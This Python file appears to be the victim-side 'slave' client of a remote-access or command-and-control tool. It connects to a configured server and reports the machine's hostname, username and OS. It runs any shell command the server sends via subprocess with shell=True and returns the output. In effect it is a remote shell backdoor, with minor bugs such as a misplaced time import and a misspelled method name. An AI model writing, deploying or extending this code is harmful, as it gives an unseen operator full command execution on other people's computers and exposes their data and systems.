from src.client import Client
from pprint import pprint
import platform
import os
import subprocess as sp

class SlaveClient(Client):
    def __init__(self, addr: tuple, debug: bool = False) -> None:
        super().__init__(addr, debug)

        self.commands = Commands(self)

    def handle_connection(self) -> bool:
        if self.debug: print(f"[CLIENT] Sending identity to server")
        self.send_bytes(b'Slave')
        if self.recv_bytes() == b'OK':
            if self.debug: print(f"[CLIENT] Server accepted identity")
            return True
        return False

    def command_loop(self):
        while True:
            time.sleep(0.1)
            if not self.connected:
                self.connect()
                continue

            msg = slave.recieve_dict()
            if not msg: continue
            match msg['type']:
                case 'command':
                    match msg['command']:
                        case 'pc_info':
                            self.commands.pc_info()
                        case 'cmd':
                            self.commands.cmd(msg)

            print(f'Msg of type {msg["type"]} not implemented.')
            pprint(msg)

class Commands:
    def __init__(self, slave) -> None:
        self.slave = slave

    def pc_info(self):
        msg = {
            "hostname": platform.node(),
            "username": os.getlogin(),
            "os": platform.system(),
            "os_version": platform.version(),
            }
        self.slave.send_dict(msg)
    
    def cmd(self, msg):
        res = sp.Popen(msg['command_string'], shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
        output = res.stdout.read().decode('utf-8')
        self.slave.send_dict({'cmd_output': output})


if __name__ == "__main__":
    from config import Config
    import time

    slave = SlaveClient(addr=Config.SERVER_ADDR, debug=True)

    slave.command_loop()